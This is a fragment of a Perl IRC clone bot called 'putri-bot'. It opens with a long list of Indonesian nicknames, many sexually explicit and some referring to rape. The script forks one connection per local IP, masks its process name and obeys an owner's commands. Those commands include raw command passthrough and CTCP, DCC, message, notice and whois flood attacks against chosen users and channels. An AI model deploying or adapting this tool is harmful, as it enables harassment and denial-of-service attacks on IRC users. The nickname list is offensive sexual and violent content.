"co_BuGil_SeNdiRian","co_Bule-cr-knln","co_butuh_cairan","co_ByRAn_nOw","co_c4-NtIk_cUTe","co_cAEm_yUhuu","co_cakep-cr-pcr","co_cantikgirl","co_cANtIqUe","co_capi_fs","co_cARi_cO_cAkEp","co_cari_cowo_chns","co_cari_doktermuda","co_cari_pacar",
"co_CaRi_TemeN_BoBo","co_chinese","co_chn_hot","co_chn_jomblo","co_Chnz_Lezz","co_Chnz_OK","co_cimpoek","co_cinderella","co_cleopatra","co_CLuBbYnG","co_cntiq_mau_PS","co_cntix_kul","co_cRi","co_cute_n_cantiq","co_dada_kecil","co_dah_basah_neh",
"co_dah_basah","co_Devi","co_dijamin","co_doyan_kehotel","co_dws_Maniz","co_eviana","co_FiTa","co_fitri","co_full","co_fun_danco_cluber","co_ge_pngen","co_happy","co_keyrenz","co_kos_dinodai","co_kos_butuh","co_kos_pengen","co_kosan_bth",
"co_kosan_sndiri","co_Lesbi","co_lesby_horny","co_LG_KSEPIAN","co_LuOcU","co_m0_Lepas_KepeRawanan","co_ma0_mERasaKan_ML","co_manda_maniez","co_Maniax_sek","co_mauML","co_marsha","co_mo_dinodai_2x","co_MoNTok","co_montox","co_mungil",
"co_mUpEng","co_nWarzIZ_CR","co_nafsu_gede","co_nakal_bgtz","co_ngebet","co_nongkronk","co_pLing_imUth","co_pnggin","co_puengen_bgt","co_ratu_buaya","co_sedang_cr_cinta","co_seksi","co_susu_montok","co_swe3t_cr_co","co_tuLen","cow-17-model",
"coW_8u61L_HoT","cow_bth_kehangatan","cow_dhiajenk","cow_herrera","cow_hester","cow_heubert","cow_heyeck","cow_himmelfarb","cow_hind","cow_hirst","cow_hitchcock","cow_hoang","cow_hock","cow_dramatix","cow_ga_sk_fs","cow_GiLa_hEpOtEsA",
"cow_horny_nie","cow_jmbLo_sBy_imutzZ","coW_LopHE_mUtZz","cow_modeling","cowek_Suka_ga_pake","cow_nia","cow_sexyss","cow_lawless","cow_lecar","cow_lecco","cow_leclercq","cow_leite","cow_lenard","co_sofia","cow_lesser","cow_lessi","cow_liakos",
"cow_lidano","cow_liem","co_pelit","co_politis","co_rivera","co_row","co_royal","co_ru","co_sexton","co_stock-terbatas","co_sumer","co_tuttle","co_bikini_mulus","co_bikini_model","co_valencia","co_vanZwet","co_venne","cowex_white",
"co_viana","co_viens","co_villarreal","cowex_cr_mrP","co_vital","co_viviani","co_me2_imoet","cowex_nakal","co_butuh_pisanggg","cowex_butuh_gituan","cowe_butuh_gituan","cow_biasa_ja_YM","cow_lg_YM","cow_ol_YM","cow_online_YM","cow_ol_YM",
"cow_online_YM","cow_dJombLow","cow_niezt","cow_kerens","cow_cantieks","cow_setia-sedunia","cow_sby_setia","cow_mnizzzz_bgt","cow_setia_cr_cow","cow_super_setia","cow_manis_fs","cow_pengen_punya_cow","cow_setia-bgt","cow_jelek_setia",
"cow_jelek-bgt","cow_jlk_tp_setia","cow_cr_serius","cow_biasa_setia","cow_setiaaaa","cow_paling_maniz","cow_setia_bgtttt","cow_jojoba","cow_jomblo_cr_cow","co_perayu_cow","cow_perayu_cow","cow_perayu_cow","cow_mulus_cantiq","co_mulus_cantiq",
"cow_mulus_cantiq","cow_mulus_cantiq","cow_mulus_butuhhh","co_mulus_butuhhh","cow_mulus_butuhhh","cow_mulus_butuhhh","cow_mw_dibayarr","cow_mw_dibayarr","co_mw_dibayarr","cow_mw_dibayarr","cow_butuh-bgt","co_butuh-bgt","cow_butuh-bgt",
"cow_butuh-bgt","cow_cr_pemuassss","co_cr_pemuassss","cow_cr_pemuassss","cow_cr_pemuassss","co_cr_perjaka","cow_cr_perjaka","cow_cr_perjaka","cow_cr_perjaka","cow_","cow_minta_diperkosa","co_minta_diperkosa","cow_minta_diperkosa",
"cow_minta_diperkosa","cow_","cow_ga-pake_CD","co_ga-pake_CD","cow_ga-pake_CD","cow_","cow_","cow_","co_ga-pake_bra","cow_ga-pake_bra","cow_ga-pake_bra","cow_bra_pink","cow_cd_pink","co_cd_pink","co_nungging","co_kenikmatannn",
"co_cr_gituann","co_pengen_digituin","co_butuhhh","cow_ga_kuat","co_panas_bgt","co_lg_pengen","co_lage_hot","co_demen_gituan","co_pemerkosa","co_pengen_gituan","co_mw_gituan","cow_pengen_gituan","cow_sk_gituan","cow_sk_bokep",
"cow_bokep","cow_bokepers","cow_site_bokep","cow_bayar_murah","cow_suka_om2","cow_butuh_pemuas","cow_butuh_pemerkosa","cow_cr_pemerkosa","cow_betah_diperkosa","cow_kuat_di-ranjang","cow_kuat_bngt","cow_mase_kuat","cow_pelampiasan",
"cow_cr_pelampiasan","cow_pemerkosa_cow","cow_pengen_nikmat","cow_cr_nikmat","cow_","cow_jual_itu","cow_di-jual","cow_murahan","cow_murahan-bgt","cow_cr_palanggan","cow_psk_asyik","cow_jagir","cow_jarak","cow_kalimatan","cow_cr_kenikmatan",
"cow_pembawa_nikmat","cow_pemerkosa","cow_mw_dinaikin","cow_lg_pengen","cow_lg_dapet","cow_nakal_pengen","cowex_nakal-bgt","cowex_cantik_nakal","cowex_mulus_binal","cowex_putih_mulus","cowex_pengen_dianu","cowex_anunya_mungil","cowex_itunya-kecil",
"cowex_ga_pake_cd","cowex_","cow_cr_pemuassss","cow_cr_pemerkosa","cow_bikin_anak","cowex_kupu2malam","cowek_kupu2malam","cow_kupu2malam","cow_kupu2malam","cow_mw_di-anu","cow_mw_diraba","cow_mw_digituin","cow_pengen_digituin","cow_pengen_nikmat",
"cow_kenikmatan_sesaat","cow_cr_kenikmatan","cow_cr_om2","cow_mw_ama_om2","cow_mw_dipesan","cow_mw_dibayar","cow_cr_gratisan","cow_pengen_anu_cow","cow_lg_pengen","cow_pengen_dielus","cow_itunya_merah","cow_cr_kesenangan","cow_mulus_cr_cow",
"cow_mulus_bgt","cow_putih_mulus","cow_cari_nikmat","cow_cari_nikmat","cow_cr_nikmat","cow_cr_nikmat","cow_pngn_buang_virgin","cow_pngn_dihajar","cow_meranjang","cow_meranjang","cow_free4fun","cow_free4fun","cow_penghibur_cow","cow_penghibur_cow",
"cow_pngn_main_belakang","cow_pngn_main_belakang","cow_pengen_nungging","cow_pengen_nungging","cow_mw_main_kasar","cow_mw_main_kasar","cow_pngn_dinikmati","cow_penjinak_cow","cow_pengen_semalam","cow_main_isi_pulsa","cow_mw_diperkosa",
"cow_pngen_gituan","cow_cr_kesenangan","cow_pemuas_buaya","cow_pengen_jatah","cow_minta_jatah","cow_pengen_dipuasin","cow_mw_dipuasin","cow_pemuja_cow","cow_mw_gituan","cow_pengen_gituan","cow_sk_meranjang","cow_sk_ngemut","cow_sexy-bgt",
"cow_bokepers","cow_sk_burung","cow_pemuas","cow_butuh_cow","cow_rela_diperkosa","cow_pengen_di_isep","cow_ga_pakeCD","cow_telanjang","cow_maniax","cow_cutexx","cow_starone","cow_sakit","cow_semrawut","co_korax","cow_sumringah","co_kegelapan",
"cow_pujangga","cow_emperor","cow_mutiara","cow_ratu","cow_srigala","cow_jadi_jadian","cow_korek_api","cow_mulitan","cow_dewaza","cow_cafein","cow_kopi_maniz","cow_kulus","cow_dramatix","cow_tragis","cow_kenangan","cow_berbunga2","co_seal",
"cow_modeling","cow_sk_gelap","cow_nescafee","cow_cakep-bgt","cow_cantix_kul","cow_pemuassss","cow_cari_gituan","cow_cari_tugas","cow_coria","cow_17cute","cow_cleopatra","cow_cntix_kul","cow_CR_CR","cow_cr_hacker","cow_cr_web_desain",
"cow_cuanteeeeek","cow_cuet_cuet","cow_cute_cr_temen","cow_cutez","cow_desain","cow_dunia_maya","cow_Dwss_bgt","cow_Fitri_FS","cow_fS_nARziEsss","cow_mo_gajian","cow_gembredek","cow_genit_bgt","cow_gi_anu_anu","cow_gi_sibuk","cow_hackers",
"cow_ideal","cow_ImoetzzzZ","cow_imoot","cow_imootez","cow_ImUtZzZz","cow_imyuth","cow_informatika","cow_jutek_bgt","cow_kerens_fs","cow_kerj_di_internet","cow_lg_kesepian","cow_komputeris","cow_korea","cow_kul_Cantix","cow_kuliah_ITS",
"cow_lebay_euy","cow_linux_user","cow_lynx","cow_maniees","cow_maniezt_girl","cow_mAnIiEezzZ_jOmBlO","co_matre","cow_moesliem","cow_ngeblog","co_nightmare","cow_nizzz","cow_nulis_web","cow_patah_ht","cow_penulis","cow_perompak","cow_pinter_banget",
"cow_pirate","cow_product","cow_punya_blog","cow_punya_web","cow_punya_website","cow_re2","cow_riZa_efEZt","cow_SAKURA_nizz","cow_kebobolan","cow_site_modeling","cow_smart_plus_maniezz","cow_suka_anime","co_SWEETY","cow_pinter_muasin",
"cowex_putih_mulus","cow_mulussss","cow_cri_perangsang","cow_pengen_gituannn","cow_smk_it","cow_Pemangsa_Sby","cow_demen_gituan","cowex_anggun","cow_sk_bikin_anak","cow_bikini_bgt","cow_engen_lontong","cowex_crI_tMn_bAEk","cow_CutE","cow_dispro",
"cow_informatika","cow_jomblo_nizz","cow_sk_bgt","cow_anunya_mulus","cow_cr_selingkuhan","cow_teknik_industri","cow_dias_fs","cowek_belajar_web","cowek_demen_naruto","cowek_hongkong","cowek_inisial_N","cowek_japan_anime","cowek_kerj_internet",
"cowek_koleksi_movie","cowek_lg_butuh_itu","cowek_olaraga_kelamiiin","cowek_pinter","cowek_itunya_mulus","cowex_itunya_putih","cowex_korea_cakep","cowk_dJombLow","cowk_niezt","cow3k_t0mb0y","cow_kerens","cow_mursals","cow_brandals","cow_solo_lo",
"cow_ria","cow_cicak","cow_spiderman","cow_mulus_gi_pengen","cow_buaya","cow_kuliah_wk","cow_kul_unesa","cow_putih_nizz","cow_gitaris","cow_sep_bgt","cow_mantapp","cow_mo_pingsan","cow_pengen_mati","cow_ngerjain_tugas","cow_seles_nokia","cow_lamru",
"cow_jav_model","cow_av_model","cow_model_bokep","cow_model_jav","cow_model_av","cow_model_av","cow_maria_ozawa","cow_model_hot","cow_hot_model","cow_model_mulus","cow_ajak_kencan","cow_kencan_semalam","cow_making_love","cow_pemijat","cow_pijat_nikmat",
"cow_tahan_lama","cow_kuat_digilir","cow_nakal_pengen","cow_cr_nikmattt","cow_cr_kesenangan","cow_cr_om2_genit","cow_eka_mulusss","cow_mupeng_berat","cow_mupeng_banget","cow_tetek_gedee","cow_nenen","co_bokepers","cow_artis_bokep","cow_sk_bokep",
"cow_bintang_bokep","cow_sk_om2","cow_mau_ma_om2","cow_pengen_ma_om2","cow_jalan_ma_om2","cow_rok_mini","cow_rok_pendek","cow_rok_minim","cow_ga_pake_rok","cow_pake_stoking","cow_paha_mulus","cow_da2_mulus","cow_da2_gede","cow_da2_imut","cow_jual_itu",
"cow_jual_nikmat","cow_jual_jasa","cow_jalanan","cow_bad","cow_item_maniez","cow_putih_maniez","cow_kuning_maniez","cow_item_mulus","cow_kuning_mulus","cow_berbulu","cow_berbulu_pengen","cow_lg_pengennnn","cow_main_keras","cow_maen_ganas","cow_amature",
"cow_hard-Core","cow_mulus_jav","cow_av-model","cow_gunung_gede","cow_gunung_mulus","cow_lubang_buaya","cow_kupu2-malam","cow_paha_mulusss","cow_selangkangan_gatal","cow_korea_cr_cow","cow_bertato","cow_main_free","cow_main_ps","cow_pengen_ps",
"cow_penyewaan_jasa","cow_pembunuh_cow","cow_buaya_laut","cow_lubang_buaya","cow_cr_buaya","cow_DiTiduriBuaya","cow_pemuas_lelaki","cow_pemuas_cow","cow_pemuas_buaya","cow_pemuas_om2","cow_pemuas_pejantan","cow_cr-pejantan","cow_mw_ama_pejantan",
"cow_cr_mr-P","cow_demen_mr-P","cow_butuh_mr-P","cow_sk_mr-P","cow_ga_virgin","cow_hilang_virgin","cow_virgine_unlimited","cow_emut_mr-P","cow_perokok_coklat","cow_tumbuh_rambut","cow_tumbuh_gunung","cow_tumbuh_itunya","cow_mw_em-el","cow_bs_hub-intim",
"cow_mw-hub-intim","cow_pengen_hub-intim","cow_pengen_intim","cow_horrneeey","cow_gatal-itunya","cow_pemerkosa_om2","cow_pemerkosa_perjaka","cow_pemerkosa_jejaka","cow_pemerkosa_cow","cow_lessby","cow_lezzz","cow_cantix_less","cow_less_mulus","cow_biseeeks",
"cow_kuat_dikeroyok","cow_pgen_dikeroyok","cow_dikeroyok_cow","cow_itunya-gede","cow_itunya-gatal","cow_itunya-imoet","cow_itunya-mulus","cow_model_japan","cow_model_maniz","cow_model_anime","cow_haruna-sakura","cow_model-miyabi","cow_kalahin-miyabi",
"cow_panas_pengen","cow_pengen_hot","cow_borack","cow_ketagihan_cow","cow_ketagihan_pisang","cow_pengen_pisang","cow_pake_bra_ketat","cow_bispak-bgt","cow_mw_nungging","cow_stan_nungging","cow_stan_dogi","cow_boxer","cow_stan_samping","cow_pakar_bercinta",
"cow_mahir_bercinta","cow_pngen_bercinta","cow_mw_bercinta","cow_mau_bercinta","cow_tante2","cow_tante2-btuh","cow_tante2_cr","cow_tante2_pengen","cow_tante2_cr_cow","cow_free_ml","cow_free_bokep","cow_dugem_asyik","cow_ratu_dugem","cow_mw_dugem","cow_pngen_dugem",
"cow_lg_dugem","cow_lg_mabok","cow_cd_pink","cow_cd_merah","cow_cd_ijo","cow_cd_putih","cow_cd_transparan","cow_cd_item","cow_cd_biru","cow_pemusnah_massal","cow_pmusnah_cow","cow_free_video","cow_free_gituan","cow_mw_gituan-free","cow_pngen-cok-in","cow_mw_cok-in",
"cow_dadamulus","cow_da2Mulus","cow_bra_putih","cow_poto_model","cow_mw-date","cow_dapico","cow_tante_mira","cow_tante_robi","cow_tante_tati","cow_tante_tutik","cow_tutik","cow_mira","cow_vitaa","cow_eny","cow_iin","cow_eka","cow_sari","cow_linda","cow_pipit",
"cow_santi","cow_eva","cow_fany","cow_ely","cow_melly","cow_ester","cow_putri","cow_po3","cow_ella","cow_rosi","cow_inem","cow_tatik","cow_sthevani","cow_dicks","cow_dinodai","cow_ratih","cow_ajenk","cow_ajeng","cow_diah","cow_dyah","cow_marsya","cow_cantixx",
"cow_cantika","cow_anggi","cow_angelina","cow_indah","cow_permata","cow_dian","cow_pamela","cow_herlina","cow_lina","cow_nanda","cow_ananda","cow_adel","cow_adult","cow_adult_model","cow_indo_adult","cow_japan_adult","cow_sby_adult","cow_jakarta_adult","cow_modeling_adult",
"cow_cina_cuantik","cow_ckp_bngt","cow_cr_ttm","cow_CuNi3z_Fs","cow_cut3","cow_CuTe_SmA","cow_cUtEz","cow_gokiiilllll_lucu","cow_less_mutz","cow_zkull_ztar_one","co-CANTIK-ADUHAI","cow3x_chn","co_1c4gals","co_b4w3l","co_CHNZZZ_smg","co_im03t_bratang",
"co_j0m8L0","co_jut3x","co_macan_imutz","co_matre","co_SWEETY","cow_Me2_CakeP","cow_19_JOMBLO","cow_17_JOMBLO","cow_18_JOMBLO","cow_20_JOMBLO","cow_21_JOMBLO'","cow_22_JOMBLO","cow_JOMBLO","cow_tanktop","cow_berdaster","cow_daster","cow_CANTIKX",
"cow_mu4niiIIeEezZZ","cow_kerenzzs","cow_phones3x","cow_show_CaM","cow_ajaib_ok","cow_aJaH_dEcH","cow_aJIP","cow_anggun","cow_apa_adanya","cow_army","cow_aSiK_aJaH","cow_asyik_girl","cow_ayu","cow_b4n9et","cow_baEk_cr","cow_BaEk_cuTeZ_fs","cow_bahenol",
"cow_barusan_jomblo","cow_bibir_mungil","cow_beautiful_girls","cow_beauty","cow_bebas_pa_ja","cow_benci_dunia","cow_bikin_gemes","cow_binal","cow_Bispak_Gratis","cow_bRokEnheArt","cow_bsa_maen_musik","cow_bth_duit","cow_bugil","cow_BuGil_SeNdiRian","cow_Bule-cr-knln",
"cow_butuh_cairan","cow_ByRAn_nOw","cow_c4-NtIk_cUTe","cow_cAEm_yUhuu","cow_cakep-cr-pcr","cow_cantikgirl","cow_cANtIqUe","cow_capi_fs","cow_cARi_cO_cAkEp","cow_cari_cowo_chns","cow_cari_doktermuda","cow_cari_pacar","cow_CaRi_TemeN_BoBo","cow_chinese","cow_chn_hot",
"cow_chn_jomblo","cow_Chnz_Lezz","cow_Chnz_OK","cow_cimpoek","cow_cinderella","cow_cleopatra","cow_CLuBbYnG","cow_cntiq_mau_PS","cow_cntix_kul","cow_cRi","cow_cute_n_cantiq","cow_dada_kecil","cow_dah_basah_neh","cow_dah_basah","cow_Devi","cow_dijamin","cow_doyan_kehotel",
"cow_dws_Maniz","cow_eviana","cow_FiTa","cow_fitri","cow_full","cow_fun_dancow_cluber","cow_ge_pngen","cow_happy","cow_keyrenz","cow_kos_dinodai","cow_kos_butuh","cow_kos_pengen","cow_kosan_bth","cow_kosan_sndiri","cow_Lesbi","cow_lesby_horny","cow_LG_KSEPIAN","cow_LuOcU",
"cow_m0_Lepas_KepeRawanan","cow_ma0_mERasaKan_ML","cow_manda_maniez","cow_Maniax_sek","cow_mauML","cow_marsha","cow_mo_dinodai_2x","cow_MoNTok","cow_montox","cow_mungil","cow_mUpEng","cow_nWarzIZ_CR","cow_nafsu_gede","cow_nakal_bgtz","cow_ngebet","cow_nongkronk","cow_pLing_imUth",
"cow_pnggin","cow_puengen_bgt","cow_ratu_buaya","cow_sedang_cr_cinta","cow_seksi","cow_susu_montok","cow_swe3t_cr_co","cow_tuLen","cow-17-model","cow_8u61L_HoT","cow_bth_kehangatan","cow_dhiajenk","cow_herrera","cow_hester","cow_heubert","cow_heyeck","cow_himmelfarb","cow_hind",
"cow_hirst","cow_hitchcock","cow_hoang","cow_hock","cow_dramatix","cow_ga_sk_fs","cow_GiLa_hEpOtEsA","cow_horny_nie","cow_jmbLo_sBy_imutzZ","cow_LopHE_mUtZz","cow_modeling","cowek_Suka_ga_pake","cow_nia","cow_sexyss","cow_lawless","cow_lecar","cow_lecco","cow_leclercq","cow_leite",
"cow_lenard","cow_sofia","cow_lesser","cow_lessi","cow_liakos","cow_lidano","cow_liem","cow_pelit","cow_politis","cow_rivera","cow_row","cow_royal","cow_ru","cow_sexton","cow_stock-terbatas","cow_sumer","cow_tuttle","cow_bikini_mulus","cow_bikini_model","cow_valencia",
"cow_vanZwet","cow_venne","cowex_white","cow_viana","cow_viens","cow_villarreal","cow_vital","cow_viviani","cow_me2_imoet","cowex_nakal","cow_butuh_pisanggg","cowex_butuh_gituan");

my @realname  = ("14[4,1|| -14Ð-15å-0v-î-15ë-14Ð4-||14]");
my @WHO;
my $qqum="*";
$ARGC=@ARGV;
if ($ARGC !=1) {
print "\n+ putri-bot\n";
 print "+ Aturan Pakai : perl $0 (server)\n";
 print "+ betulin dulu sekripnya boss..\n\n";
 exit(1);
}
$SIG{CHLD} = sub { wait }; # alterando o signal
my $qtip = qx(/sbin/ifconfig |grep inet | wc -l);
my @ips1 =qx(/sbin/ifconfig |grep \"inet addr\:\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c6\-);
my @ips2 =qx(/sbin/ifconfig \-a |grep \"inet end\.\:\" \|awk \-F \' \' \'\{\print \$3\} \');
my @fbsd =qx(/sbin/ifconfig \|grep \"inet\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c1\-);
@ips = (@ips1, @ips2, @fbsd);
open(ipzitcho,">ips.txt") || die "- ips.txt not found";
          print ipzitcho" @ips";
          close(ipzitcho);
@ips = grep { s/\n$// } @ips;
$0 =  $procname  . "\0";
$nick2 = $nick;
print STDOUT "\n+ user\n";
print STDOUT "+ Server : $server\n";
print STDOUT "+ Port   : $port\n";
print STDOUT "+ Owner  : $owner\n";
print STDOUT "+ Channel: $channel\n";
print STDOUT "+ IPs    : $qtip\n\n";
use IO::Socket;
foreach my $FROM (@ips) {
 my $pid = fork(); # gerando um novo procosso
  unless ($pid) {   #
my $ident = $nickname[rand scalar @nickname];
my $nick = $nickname[rand scalar @nickname];
my $name = $realname[rand scalar @realname];
$sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
   print $sock "NICK ".$nick."\n";
    print $sock "USER $ident $FROM $server :$name\n";
while (<$sock>) {
        if (/^:.+?\s433\s/) { # nick already in use
            $nick2 = $nickname[rand scalar @nickname];
            print $sock "NICK ".$nick2."\n";
        }
        if (/^:.+?\s376\s/) { # end of motd
            print $sock "JOIN $channel\n";
        }

        if(/^PING :(.*)/){ #replying the ping
            print $sock "PONG :$1\n";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:.mbod (.*)/){
            print $sock "$1";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:.help(.*)/){
            print $sock "PRIVMSG ".$owner." : gp_davied\n";
            print $sock "PRIVMSG ".$owner." : #play Crew\n";
            print $sock "PRIVMSG ".$owner." : ------------\n";
            print $sock "PRIVMSG ".$owner." : .mbod join #chan\n";
            print $sock "PRIVMSG ".$owner." : .mbod part #chan\n";
            print $sock "PRIVMSG ".$owner." : .msg nick (nick)\n";
            print $sock "PRIVMSG ".$owner." : .quit\n";
            print $sock "PRIVMSG ".$owner." : ------------\n";
            print $sock "PRIVMSG ".$owner." : .ctcpflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .dccflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .noticoflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .msgflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .hop #chan (pesan)\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.msg(.*)/){
                        print $sock "PRIVMSG ".$1." : ".$2."\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.who(.*)/){
                        print $sock "who ".$channel."\n";
      }
      if (/^:.+?\s+352\s+\S+\s+\S+\s+(.+?)$/) {
                        my $nicks = $1;
                        #$nicks =~ s/\n//;
                        #$nicks =~ s/\r//;
                        push(@WHO, split(/ /, $nicks));
                        print STDOUT "$who[1]\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.dccflood(.*)/){
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :\001DCC CHAT chat 1121485131 1024\001\n";
                        }
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.whoisflood(.*)/){
                        for (1 .. 5) {
                        print $sock "whois ".$1."\n";
                        }
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.hop (.*)/){
                print $sock "JOIN ".$1." : ".$2."\n";
                        for (1 .. 5) {
                        print $sock "PART ".$1." : ".$2."\n";
                        print $sock "JOIN ".$1." : ".$2."\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.ctcpflood(.*)/){
                print $sock "PRIVMSG ".$1." :\001VERSION\001\n";
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :\001VERSION\001\n";
                        print $sock "PRIVMSG ".$1." :\001PING\001\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.msgflood(.*)/){
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :4susumu cilikkkkkkkkk\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.noticoflood(.*)/){
                        for (1 .. 5) {
                        print $sock "NOTIco ".$1." :4susumu cilikkkkkkkkk\n";
                        }
      }
      if(/^ERROR :(.*)/){
                        use IO::Socket;
                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) 

|| exit();
                        print $sock "NICK ".$nick."\n";
                        print $sock "USER $ident $FROM $server :$name\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.quit(.*)/){
                        die();
      }
      if(/^\:.*: Connection timed out(.*)/){
                        print STDOUT "[~] Connection Timed Out! Retrying!\n";
                        use IO::Socket;
                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) 

|| exit();
                        print $sock "NICK ".$nick."\n";
                        print $sock "USER $ident $FROM $server :$name\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.ssmaboyts(.*)/){
                        print $sock "PRIVMSG ".$owner." : Bot Ssmaboyts\n";
                        print $sock "PRIVMSG ".$owner." : Using server : $server\n";
                        print $sock "PRIVMSG ".$owner." : Using port   : $port\n";
                        print $sock "PRIVMSG ".$owner." : Using nick   : $nick\n";
                        print $sock "PRIVMSG ".$owner." : Using owner  : $owner\n";
                        print $sock "PRIVMSG ".$owner." : Using ident  : $id\n";
                        print $sock "PRIVMSG ".$owner." : putri-bot\n\n";
       }
       if( /^\:$owner!.*\@.*\s+PRIVMSG.*:.owner\s+(.*)/ ){
                       $owner =$1;
                       $owner =~ s/ //;
                       $owner =~ s/\r$//;
                       $owner =~ s/\n$//;
       }
   }
exit;
  } 
}